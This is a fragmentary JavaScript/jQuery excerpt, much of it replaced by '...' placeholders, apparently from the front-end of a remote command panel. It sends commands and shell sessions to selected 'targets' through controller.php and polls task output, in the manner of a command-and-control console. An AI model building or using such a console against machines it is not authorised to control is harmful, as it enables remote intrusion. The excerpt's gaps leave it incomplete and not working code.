	...
	*/			
			...
			function check_connection (command, target, timeout) {
				var u = 'controller.php?command=' + command + '&target=' + target;
				...
				$.ajax({
					...
					success : function(data) {
						if (data == 'connected') {
							...
							$.get("controller.php?command=" + 'title&target=' + target, function(data, status) {
								$("#software").html(data);
							...
							$(document).keyup(function(e) {
								e.stopImmediatePropagation();
					 			if (e.keyCode == 27) { 
									...
									$.get("controller.php?command=exit&target=" + target + "&shell=true", function(data, status) {
										if (data == 'exit') {
			...
			function check_task_output (task_id, target, timeout) {
				var u = 'controller.php?command=check output ' + task_id + '&target=' + target + '&shell=true';

				// Far scomparire shell per l'acquisizione
					...
					if (command != "") {
						...
						// Else the command will be executed server-side
							...
							if (target != "") {
								...
								if (shell == 'true') {
									$.get("controller.php?command=" + command + "&target=" + target + "&shell=true", function(data, status) {	
										if (data == 'exit') {
									...
									$.get("controller.php?command=" + command + "&target=" + target, function(data, status) {		
							...
							// Else if no targets is selected
								...
								$.get("controller.php?command=" + encodeURIComponent(command), function(data, status) {
